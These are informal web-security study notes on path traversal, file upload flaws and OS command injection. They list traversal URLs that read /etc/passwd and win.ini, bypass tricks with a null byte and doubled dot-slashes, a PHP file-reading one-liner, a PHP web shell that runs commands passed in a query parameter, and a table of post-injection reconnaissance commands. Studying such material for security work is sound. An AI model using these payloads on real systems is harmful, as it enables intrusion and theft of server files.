## Path Traversal

`<img src="/loadImage?filename=218.png">` - it is like this then it mostly loads from `/var/www/images/218.png` so we can use

[https://insecure-website.com/loadImage?filename=../../../etc/passwd](https://insecure-website.com/loadImage?filename=../../../etc/passwd) - linux

[https://insecure-website.com/loadImage?filename=](https://insecure-website.com/loadImage?filename=)..\..\..\windows\win.ini - windows

when the server strips the path use - ….//….// like this

NULL BYTE - filename=../../../etc/passwd%00.png

/robots.txt - check this

vertical and horizontal privilege escalation

---

## File upload vulnerabltities

PHP one-liner could be used to read arbitrary files from the server's filesystem:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

A more versatile web shell may look something like this:  
`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:  
`GET /example/exploit.php?command=id HTTP/1.1`

---

OS Command - use | along with some command

|Purpose of command|Linux|Windows|
|---|---|---|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconfig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|